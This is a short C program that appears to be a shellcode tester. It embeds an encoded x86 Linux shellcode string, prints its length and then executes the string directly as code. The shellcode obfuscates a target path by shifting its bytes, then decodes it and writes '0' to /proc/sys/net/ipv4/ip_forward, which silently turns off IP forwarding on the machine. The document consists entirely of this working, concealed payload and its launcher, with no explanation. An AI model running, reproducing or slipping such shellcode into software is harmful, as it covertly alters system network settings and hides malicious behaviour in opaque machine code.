#include <stdio.h>
#include <string.h>


char *shellcode = "\x29\xc0\x50\x68\x67\x51\x62\x54\x68\x4f\x56\x5f\x62\x68\x24\x1f\x59\x60\x68\x1f\x59\x60\x66\x68\x1f\x5e\x55\x64\x68\x63\x69\x63\x1f\x68\x62\x5f\x53\x1f\x89\xe3\x8a\x0b\x80\xc1\x10\x88\x0b\x43\x80\xf9\x64\x75\xf3\x66\x68\x2f\x70\x89\xe3\x31\xc9\xb1\x01\xb0\x04\xfe\xc0\xcd\x80\x89\xc3\x31\xc9\x89\xca\x51\x6a\x30\x89\xe1\xb2\x01\xb0\x04\xcd\x80\x31\xc0\x83\xc0\x06\xcd\x80\x31\xc0\x89\xc3\x40\xcd\x80";


int main(void){
	fprintf(stdout,"Length: %d\n",strlen(shellcode));
	(*(void(*)()) shellcode)();
	return 0;
}


